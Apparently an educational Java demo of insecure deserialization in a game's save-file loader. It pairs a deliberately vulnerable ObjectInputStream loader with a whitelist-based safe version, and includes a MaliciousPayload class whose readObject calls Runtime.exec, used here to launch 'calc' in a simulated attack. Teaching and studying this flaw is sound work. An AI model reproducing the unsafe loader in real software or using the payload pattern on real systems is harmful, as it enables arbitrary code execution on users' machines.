import java.io.*;
import java.util.*;

// 游戏存档数据类
class GameSaveData implements Serializable {
    private String playerName;
    private int score;
    private Map<String, Object> inventory;

    public GameSaveData(String playerName, int score) {
        this.playerName = playerName;
        this.score = score;
        this.inventory = new HashMap<>();
    }

    public void addItem(String itemName, Object item) {
        inventory.put(itemName, item);
    }

    @Override
    public String toString() {
        return "Player: " + playerName + ", Score: " + score + ", Inventory: " + inventory.keySet();
    }
}

// 恶意类示例（攻击者实际会使用更隐蔽的gadget链）
class MaliciousPayload implements Serializable {
    private String command;

    public MaliciousPayload(String command) {
        this.command = command;
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        // 模拟任意代码执行
        Runtime.getRuntime().exec(command);
    }
}

public class VulnerableGame {
    // 不安全的存档加载方法
    public static Object loadSaveFile(String filePath) throws IOException, ClassNotFoundException {
        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filePath))) {
            // 漏洞点：直接反序列化不可信数据
            return ois.readObject();
        }
    }

    // 安全的存档加载方法（对比参考）
    public static Object safeLoadSaveFile(String filePath) throws IOException, ClassNotFoundException {
        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filePath)) {
            @Override
            protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
                // 添加白名单校验
                if (!desc.getName().equals(GameSaveData.class.getName()) && 
                    !desc.getName().equals(HashMap.class.getName())) {
                    throw new InvalidClassException("Unauthorized deserialization attempt: " + desc.getName());
                }
                return super.resolveClass(desc);
            }
        }) {
            return ois.readObject();
        }
    }

    public static void saveGame(GameSaveData data, String filePath) throws IOException {
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filePath))) {
            oos.writeObject(data);
        }
    }

    public static void main(String[] args) {
        // 模拟游戏存档操作
        try {
            // 创建初始存档
            GameSaveData saveData = new GameSaveData("Player1", 1000);
            saveData.addItem("Sword", new HashMap<>(Map.of("damage", 50)));
            saveGame(saveData, "game_save.dat");
            System.out.println("[+] 正常存档已创建");

            // 模拟加载存档（存在漏洞）
            System.out.println("[i] 正在加载存档...");
            Object loaded = loadSaveFile("game_save.dat");
            System.out.println("Loaded save data: " + loaded);

            // 模拟攻击场景（需要实际攻击时替换为恶意序列化数据）
            if (args.length > 0 && args[0].equals("--attack")) {
                System.out.println("[!] 模拟攻击场景...（实际攻击需要构造恶意序列化数据）");
                GameSaveData attackData = new GameSaveData("Hacker", 9999);
                attackData.addItem("MaliciousItem", new MaliciousPayload("calc")); // 模拟计算器执行
                saveGame(attackData, "malicious_save.dat");
                System.out.println("[+] 恶意存档已创建（需要实际序列化gadget链才能触发漏洞）");
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}